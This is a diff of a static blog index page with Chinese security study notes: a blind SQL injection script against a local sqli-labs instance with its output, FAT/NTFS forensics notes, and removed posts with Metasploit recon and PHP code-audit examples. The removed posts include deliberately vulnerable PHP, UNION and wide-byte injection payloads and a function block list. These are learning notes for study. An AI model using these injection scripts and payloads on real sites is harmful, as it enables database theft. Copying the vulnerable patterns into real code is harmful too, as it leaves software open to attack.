@@ -76,6 +76,72 @@
     
     
     
+    <article id="post-php" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/06/11/php/"
+    >php</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/06/11/php/" class="article-date">
+  <time datetime="2020-06-11T06:28:21.000Z" itemprop="datePublished">2020-06-11</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+    <footer class="article-footer">
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
     <article id="post-sqli-labs" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
@@ -135,16 +201,108 @@
 
 
 
+<p>{0}代表数据库的第几位<br>{1}代表acsii码的数值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">722</span> s <span class="number">115</span></span><br><span class="line"><span class="number">722</span> e <span class="number">101</span></span><br><span class="line"><span class="number">722</span> c <span class="number">99</span></span><br><span class="line"><span class="number">722</span> u <span class="number">117</span></span><br><span class="line"><span class="number">722</span> r <span class="number">114</span></span><br><span class="line"><span class="number">722</span> i <span class="number">105</span></span><br><span class="line"><span class="number">722</span> t <span class="number">116</span></span><br><span class="line"><span class="number">722</span> y <span class="number">121</span></span><br><span class="line">security</span><br></pre></td></tr></table></figure>
 
 
 
 
 
 
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+    <footer class="article-footer">
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-Forensics" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/04/26/Forensics/"
+    >Computer Forensics</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/04/26/Forensics/" class="article-date">
+  <time datetime="2020-04-26T05:10:03.000Z" itemprop="datePublished">2020-04-26</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
 
 
+      
 
-
+      
+      <h2 id="文件系统取证"><a href="#文件系统取证" class="headerlink" title="文件系统取证"></a><strong>文件系统取证</strong></h2><p>课程要求：</p>
+<p>了解：计算机启动过程、硬盘结构。</p>
+<p>掌握：<strong>FAT文件系统</strong>取证、FAT取证实例、<strong>NTFS文件系统</strong>取证、NTFS取证实例。</p>
+<p>英文单词：</p>
+<p>clusters: 簇，最小单位</p>
+<p>操作系统规定<strong>一个簇中只能放置一个文件的内容</strong>，因此文件所占用的空间，只能是簇的整数倍；如果文件实际大小小于一簇，它也要占一簇的空间。如果文件实际大小大于一簇，根据逻辑推算，那么该文件就要占两个簇的空间。所以，一般情况下文件所占空间要略大于文件的实际大小，只有在少数情况下，即文件的实际大小恰好是簇的整数倍时，文件的实际大小才会与所占空间完全一致。</p>
+<p>1.分区表MBR</p>
+<p>4个分区表中包含哪些信息</p>
+<p>—分区的类型、状态、大小、起始地址、结束地址等等</p>
+<p>，内容</p>
+<p>2.创建、删除、恢复（在FAT\NTFS)</p>
+<p><strong>2.FAT</strong></p>
+<p><strong>3.NTFS</strong></p>
+<p>每一个文件的头部、38表示</p>
+<p>10表示-基本信息属性、30-名字属性、对应位置</p>
+<p>常驻属性和非常驻属性</p>
+<p>FAT – File Allocation Table （文件分配表）</p>
+<p>NTFS – New Technology File System （新技术文件系统）</p>
+<p>FAT删除</p>
+<p>1.文件名开头以  HEX E5 </p>
+<p>2.删除相应的簇链，簇链设置为0</p>
+<p>3.最后4个字节是 0A 00  代表文件大小</p>
+<p>再往前的 51 00  代表簇号</p>
 
       
       <!-- reward -->
@@ -1660,486 +1818,6 @@
     <footer class="article-footer">
       
       
-
-    </footer>
-
-  </div>
-
-  
-
-  
-  
-  
-
-  
-
-</article>
-    
-    <article id="post-Metasploit魔鬼训练营" class="article article-type-post" itemscope
-  itemprop="blogPost" data-scroll-reveal>
-
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/"
-    >Metasploit魔鬼训练营</a
-  >
-</h2>
-  
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/" class="article-date">
-  <time datetime="2020-04-01T08:48:01.000Z" itemprop="datePublished">2020-04-01</time>
-</a>
-      
-      
-      
-      
-    </div>
-    
-
-    
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h2 id="一、基础知识概念"><a href="#一、基础知识概念" class="headerlink" title="一、基础知识概念"></a><strong>一、基础知识概念</strong></h2><p><strong>黑盒测试：</strong>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p>
-<p><strong>白盒测试：</strong>拥有客户组织所有知识的情况下，进行的渗透测试</p>
-<p>PTES渗透测试标准，具体包括7个阶段：</p>
-<p><strong>1.前期交互截断</strong></p>
-<p>  确定渗透测试的范围、目标、限制条件以及服务合同细节。主要是收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标等</p>
-<p><strong>2.情报收集阶段</strong></p>
-<p><strong>3.威胁建模阶段</strong></p>
-<p><strong>4.漏洞分析阶段</strong></p>
-<p><strong>5.渗透攻击阶段</strong></p>
-<p><strong>6.后渗透攻击阶段</strong></p>
-<p><strong>7.报告阶段</strong></p>
-<h2 id="二、相关命令"><a href="#二、相关命令" class="headerlink" title="二、相关命令"></a><strong>二、相关命令</strong></h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><h4 id="whois域名注册信息查询"><a href="#whois域名注册信息查询" class="headerlink" title="whois域名注册信息查询"></a><strong>whois</strong>域名注册信息查询</h4><p>一般域名注册信息包含<strong>域名所有者、服务商、管理员邮件地址、域名注册信息和过期日期</strong>等</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; whois testfire.net</span><br><span class="line">[*] exec: whois testfire.net</span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html</span><br><span class="line">   Updated Date: 2019-09-08T04:08:07Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2020-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br></pre></td></tr></table></figure>
-
-<p>注意：查询的时候去掉www、ftp等前缀，<a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 是abc.com的一个子域名</p>
-<hr>
-<h4 id="nslookup与dig域名查询"><a href="#nslookup与dig域名查询" class="headerlink" title="nslookup与dig域名查询"></a>nslookup与dig域名查询</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=A  <span class="comment">#可以对其ip地址进行解析   set type=MX 可以查找邮件转发服务器</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; dig @ASIA3.AKAM.NET testfire.net  #使用方法--dig @DNS服务器 待查询的域名</span><br><span class="line">[*] exec: dig @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 53989</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;testfire.net.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">testfire.net.           86400   IN      A       65.61.137.117</span><br><span class="line"></span><br><span class="line">;; Query time: 300 msec</span><br><span class="line">;; SERVER: 23.211.61.64#53(23.211.61.64)</span><br><span class="line">;; WHEN: 四 4月 23 22:19:09 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 57</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-      
-      <!-- reward -->
-      
-    </div>
-    
-    
-      <!-- copyright -->
-      
-    <footer class="article-footer">
-      
-      
-
-    </footer>
-
-  </div>
-
-  
-
-  
-  
-  
-
-  
-
-</article>
-    
-    <article id="post-代码审计" class="article article-type-post" itemscope
-  itemprop="blogPost" data-scroll-reveal>
-
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"
-    >代码审计</a
-  >
-</h2>
-  
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
-  <time datetime="2020-03-26T06:15:23.000Z" itemprop="datePublished">2020-03-26</time>
-</a>
-      
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-  </div>
-
-      
-      
-      
-    </div>
-    
-
-    
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h2 id="PHP核心配值解释"><a href="#PHP核心配值解释" class="headerlink" title="PHP核心配值解释"></a>PHP核心配值解释</h2><p>​                                                                       <strong>PHP_INI_* 模式的定义</strong></p>
-<table>
-<thead>
-<tr>
-<th>模式</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><em>PHP_INI_USER</em></td>
-<td>可在用户脚本（例如  ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定</td>
-</tr>
-<tr>
-<td><em>PHP_INI_PERDIR</em></td>
-<td>可在 php.ini，.htaccess 或 httpd.conf 中设定</td>
-</tr>
-<tr>
-<td><em>PHP_INI_SYSTEM</em></td>
-<td>可在 php.ini 或 httpd.conf 中设定</td>
-</tr>
-<tr>
-<td><em>PHP_INI_ALL</em></td>
-<td>可在任何地方设定</td>
-</tr>
-<tr>
-<td><em>php_ini only</em></td>
-<td>仅可在php.ini中配值</td>
-</tr>
-</tbody></table>
-<h3 id="1-register-globals-全局变量注册开关"><a href="#1-register-globals-全局变量注册开关" class="headerlink" title="1.register_globals(全局变量注册开关)"></a><strong>1.register_globals(全局变量注册开关)</strong></h3><p>on——会直接把拥护GET、POST等方式提交上来的参数注册成全局变量，并初始化值为参数对应的值，使得题交参数可以直接在脚本中使用。</p>
-<p>PHP5.4.0以下的版本可以正常使用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'chj'</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3" style="zoom: 80%;">
-
-<h3 id="2-allow-url-include-是否允许包含远程文件"><a href="#2-allow-url-include-是否允许包含远程文件" class="headerlink" title="2.allow_url_include(是否允许包含远程文件)"></a><strong>2.allow_url_include(是否允许包含远程文件)</strong></h3><p>on——可以直接包含远程文件   </p>
-<p>测试代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" style="zoom:80%;">
-
-<h3 id="3-magic-quotes-gpc-魔术引号自动过滤"><a href="#3-magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="3.magic_quotes_gpc(魔术引号自动过滤)"></a><strong>3.magic_quotes_gpc(魔术引号自动过滤)</strong></h3><p>on——会自动在GET、POST、COOKIE变量中的 ‘  ‘’  \  以及空字符NULL 的前面加上反斜杠（\）</p>
-<p>但是PHP5中的magic_quotes_gpc并<strong>不会过滤$_SERVER变量</strong>，导致很多<strong>类似client-ip,referer</strong>一类的漏洞能够利用。</p>
-<p>PHP5.4版本之后<strong>取消了magic_quotes_gpc</strong></p>
-<p>PHP版本小于4.2.3时，配值范围是PHP_INI_ALL</p>
-<p>PHP版本大于4.2.3时，是PHP_INI_PERDIR</p>
-<p>测试代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'chj'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt></p>
-<h3 id="4-magic-quotes-runtime-魔术引号自动过滤"><a href="#4-magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="4.magic_quotes_runtime(魔术引号自动过滤)"></a><strong>4.magic_quotes_runtime(魔术引号自动过滤)</strong></h3><p>magic_quotes_runtime和magic_quotes_gpc功能一样，区别是处理的对象不一样</p>
-<p>magic_quotes_runtime<strong>只对从数据库或者文件中获取的数据进行过滤</strong></p>
-<p>由于很多人只对外部输入的数据进行过滤，所以有的攻击者可先将攻击代码写入数据库，在程序读取后即可触发攻击</p>
-<p>同样<strong>在PHP5.4版本以后也取消了</strong></p>
-<p>注意，只有部分函数受它影响，所以是可以绕过这个配值的。</p>
-<p>受影响的包括get_meta_tags()、stream_socket_recvform()、exec()…等等</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件1.txt  1 '2"3\4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"magic_quotes_runtime"</span>,<span class="string">"1"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"D:/phpstudy_pro/WWW/phpsafe/1.txt"</span>);<span class="comment">#把整个文件读入一个字符串中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>输出如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> \<span class="string">'2\"3\\4</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-magic-quotes-sybase-魔术引号自动过滤"><a href="#5-magic-quotes-sybase-魔术引号自动过滤" class="headerlink" title="5.magic_quotes_sybase(魔术引号自动过滤)"></a><strong>5.magic_quotes_sybase(魔术引号自动过滤)</strong></h3><p>magic_quotes_sybase指令用于自动过滤特殊字符，设置为on时，会覆盖gpc的配值</p>
-<p>它和gpc的区别在于，仅仅转义了空字符和把单引号( ’ )变成了双引号( “ )</p>
-<p>在PHP5.4.0中移除了</p>
-<h3 id="6-safe-mode-安全模式"><a href="#6-safe-mode-安全模式" class="headerlink" title="6.safe_mode(安全模式)"></a><strong>6.safe_mode(安全模式)</strong></h3><p>安全模式是PHP内嵌的一种安全机制，当safe_mode=on时：</p>
-<p>（1）所有文件操作函数都会收到限制</p>
-<p>（2）通过函数popen()、system()以及exec()等函数执行命令或程序会提示错误</p>
-<h3 id="7-open-basedir-PHP-可访问目录"><a href="#7-open-basedir-PHP-可访问目录" class="headerlink" title="7.open_basedir PHP 可访问目录"></a><strong>7.open_basedir PHP 可访问目录</strong></h3><p>open_basedi指令用来限制PHP只能访问哪些目录</p>
-<p>例如配值open_basedi=/www/a，那么目录/www/a 和 /www/ab 都是可以访问的。</p>
-<p>如果open_basedi=/www/a/，那么只能访问/www/a/</p>
-<p>PHP版本小于5.2.3时，是PHP_INI_SYSTEM，</p>
-<p>大于等于5.2.3是PHP_INI_ALL</p>
-<h3 id="8-disable-functions-禁用函数"><a href="#8-disable-functions-禁用函数" class="headerlink" title="8.disable_functions(禁用函数)"></a><strong>8.disable_functions(禁用函数)</strong></h3><p>在正式的生产环境中，为了更安全的运行PHP，使用此指令来禁止一些敏感函数的使用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=phpinfo,<span class="keyword">eval</span>,passthru,exec,system</span><br></pre></td></tr></table></figure>
-
-<p>配值禁用函数的时候，按照以上格式分割函数名，配值范围是php.ini only</p>
-<p>切记，也要把dl()函数加到禁用列表，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破限制。</p>
-<h3 id="9-display-errors和error-reporting-错误显示"><a href="#9-display-errors和error-reporting-错误显示" class="headerlink" title="9.display_errors和error_reporting 错误显示"></a><strong>9.display_errors和error_reporting 错误显示</strong></h3><p>display_errors 表示是否显示PHP脚本内部错误，在调试的时候通常打开，但是在生产环境中建议关闭。</p>
-<p>error_reporting 是用来配值错误显示的级别。</p>
-<hr>
-<h2 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a><strong>通用代码审计思路</strong></h2><h3 id="1-敏感函数回溯参数过程"><a href="#1-敏感函数回溯参数过程" class="headerlink" title="1.敏感函数回溯参数过程"></a><strong>1.敏感函数回溯参数过程</strong></h3><hr>
-<h2 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a><strong>漏洞挖掘与防范（基础篇）</strong></h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a><strong>1.SQL注入</strong></h3><p>本质：SQL注入是直接面对数据库进行攻击的</p>
-<p>攻击方式：</p>
-<p>一、在权限较大的情况下，可通过SQL注入直接写入webshell或者直接执行系统命令</p>
-<p>二、在权限较小的情况下，可获得管理员密码等，或者修改数据库内容进行钓鱼等</p>
-<p>常用工具：sqlmap</p>
-<p>挖掘经验：sql注入经常出现在登录页面、获取HTTP头、订单处理等</p>
-<p>登录页面的注入多数发生在HTTP头里面的client-ip和x-forward-for</p>
-<p>1.1普通注入</p>
-<p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$uid=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id=$uid"</span>;</span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>);</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>输出：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4.1php?id=-1 union select 1,user(),3,4</span></span><br><span class="line">当前SQL语句：SELECT*FROM userinfo where id=<span class="number">-1</span> union select <span class="number">1</span>,user(),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">结果：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">1</span> [<span class="number">1</span>] =&gt; root@localhost [<span class="number">2</span>] =&gt; <span class="number">3</span> [<span class="number">3</span>] =&gt; <span class="number">4</span> )</span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是，7.x版本中已经舍弃了mysql_connect()，所以需要改为mysqli_connect()</p>
-<table>
-<thead>
-<tr>
-<th><strong>mysqli_fetch_row()</strong></th>
-<th><strong>从结果集中取得一行，并作为枚举数组返回。</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>mysqli_select_db()</strong></td>
-<td><strong>用于更改连接的默认数据库</strong></td>
-</tr>
-<tr>
-<td><strong>mysqli_query()</strong></td>
-<td><strong>执行某个针对数据库的查询。</strong></td>
-</tr>
-<tr>
-<td><strong>mysqli_connect()</strong></td>
-<td><strong>打开一个到 MySQL 服务器的新的连接</strong></td>
-</tr>
-</tbody></table>
-<p>从上述测试代码可以知道，数据库操作存在一些关键词如mysqli_query等，查询方式还有update、insert、delete等</p>
-<p>在做白盒审计的时候，只需要查找这些关键字就可以定向挖掘SQL注入漏洞。</p>
-<h3 id="2-编码注入-宽字节注入"><a href="#2-编码注入-宽字节注入" class="headerlink" title="2.编码注入-宽字节注入"></a><strong>2.编码注入-宽字节注入</strong></h3><p>程序在操作前会进行一些编码处理，通过输入转码函数不兼容的特殊字符，可以导致输出的字符变成有害数据</p>
-<p>最常见的编码注入是MySQL宽字节以及urldecode/rawurldecode函数导致的</p>
-<p><strong>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</strong></p>
-<p>这是由于单引号被自动转义成 \‘  , 前面的<strong>%df和转义字符\ 反斜杠(%5c) 组合成了 %df%5c</strong> 。也就是運字</p>
-<p>这时候单引号依然还在，于是成功闭合了前面的单引号</p>
-<p>测试代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>)<span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line">mysqli_query($conn,<span class="string">"set names 'gbk'"</span>);</span><br><span class="line">$uid=addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id='$uid'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span> (!$result) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"wro"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%df<span class="string">' union select 1,2,3,4#</span></span><br></pre></td></tr></table></figure>
-
